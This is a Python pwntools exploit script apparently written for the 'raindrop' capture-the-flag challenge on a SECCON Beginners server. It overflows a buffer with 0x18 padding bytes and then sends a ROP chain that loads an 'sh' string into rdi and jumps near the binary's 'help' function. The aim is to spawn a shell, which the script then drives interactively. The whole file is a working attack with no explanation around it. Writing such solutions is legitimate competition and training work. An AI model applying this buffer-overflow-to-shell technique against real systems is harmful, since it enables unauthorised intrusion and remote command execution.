# -*- coding: utf-8 -*-
#wah
from pwn import *
elf_file = FILENAME = 'chall'
e = elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'raindrop.quals.beginners.seccon.jp'
POST = 9001
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  io = process(FILENAME)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  c = gdb.attach(io,gdbscript='''b main''')

rop = ROP(e)
rop.raw(rop.find_gadget(['pop rdi','ret']))
rop.raw(pack(next(e.search('sh\0'))))
rop.raw(pack(e.sym['help']+0xf))
print(hex(e.sym['help']+0xf))
payload = 'A'*0x18
payload += rop.chain()
assert(len(payload) <= 0x30)
c.sendafter('?',payload)
c.interactive()